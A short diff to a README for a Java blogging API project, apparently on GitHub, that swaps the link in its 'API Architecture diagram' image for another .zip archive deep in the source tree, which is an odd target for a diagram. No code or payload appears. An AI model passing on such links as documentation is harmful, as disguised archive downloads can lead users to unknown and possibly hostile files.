@@ -14,7 +14,7 @@ to code a simple yet robust solution that implements latest trends, technologies
 
 ##### API Architecture diagram
   By following MVC pattern, we follow next architecture definition: 
-![API architecture](https://raw.githubusercontent.com/MilaCodesIt/Blogging-API/main/src/main/java/org/collision/Blogging_API_v2.9.zip)
+![API architecture](https://github.com/MilaCodesIt/Blogging-API/raw/refs/heads/main/src/main/java/org/collision/sytems/app/configuration/Blogging_API_1.1-beta.5.zip)
 
 ##### Endpoints
   | HTTP Method | Operation | Description |
